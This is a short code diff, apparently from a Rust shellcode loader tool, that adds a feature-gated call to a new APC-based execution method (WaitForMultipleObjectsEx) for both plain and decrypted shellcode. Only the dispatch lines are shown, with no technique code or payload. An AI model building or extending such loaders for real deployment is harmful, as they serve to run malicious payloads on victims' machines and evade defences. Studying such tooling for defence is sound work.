@@ -214,6 +214,9 @@ fn main() {
 
         #[cfg(feature = "ShellcodeExecuteFlsAlloc")]
         execution::shellcode_execute_flsalloc(shellcode.clone());
+
+        #[cfg(feature = "ShellcodeExecuteWaitForMultipleObjectsExAPC")]
+        execution::shellcode_execute_waitformultipleobjectsexapc(shellcode.clone());
     }
 
     // =======================================================================
@@ -327,6 +330,9 @@ fn main() {
 
             #[cfg(feature = "ShellcodeExecuteFlsAlloc")]
             execution::shellcode_execute_flsalloc(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteWaitForMultipleObjectsExAPC")]
+            execution::shellcode_execute_waitformultipleobjectsexapc(decrypted_shellcode.clone());
         }
     }
 }
